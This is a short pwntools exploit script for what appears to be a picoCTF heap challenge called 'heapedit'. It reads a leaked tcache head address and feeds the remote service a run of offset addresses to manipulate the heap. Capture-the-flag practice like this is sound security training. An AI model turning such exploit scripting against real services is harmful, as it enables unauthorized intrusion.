from typing import Callable
import subprocess

from pwn import *

context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

vuln = ELF("./heapedit")


def solve(fact: Callable[[], tube]) -> None:
    p = fact()
    p.recvuntil(b"tcache head (start of free list) -> ")
    head = int(p.recvline().strip(), 16)

    p.recvuntil(b"address: ")
    p.sendline(b"0x" + head.to_bytes(4, "big").hex().encode())

    head += 0x90
    p.recvuntil(b"address: ")
    p.sendline(b"0x" + head.to_bytes(4, "big").hex().encode())

    head += 0x90
    p.recvuntil(b"address: ")
    p.sendline(b"0x" + head.to_bytes(4, "big").hex().encode())

    head += 0x90
    p.recvuntil(b"address: ")
    p.sendline(b"0x" + head.to_bytes(4, "big").hex().encode())

    head += 0x90
    p.recvuntil(b"address: ")
    p.sendline(b"0x" + head.to_bytes(4, "big").hex().encode())

    head += 0x90
    p.recvuntil(b"address: ")
    p.sendline(b"0x" + head.to_bytes(4, "big").hex().encode())

    p.recvall(1.0)
    p.close()


def main() -> None:
    # gdb.attach(p, gdbscript="display /4i $pc\ncontinue\n")
    # p = lambda: process(["./heapedit"])
    p = lambda: remote("candy-mountain.picoctf.net", 60325)
    solve(p)

    # cmd = ["qemu-i386", "-g", "1234", "./vuln", *payload().split(b" ")]
    # print(cmd)
    # subprocess.run(cmd)


if __name__ == "__main__":
    main()
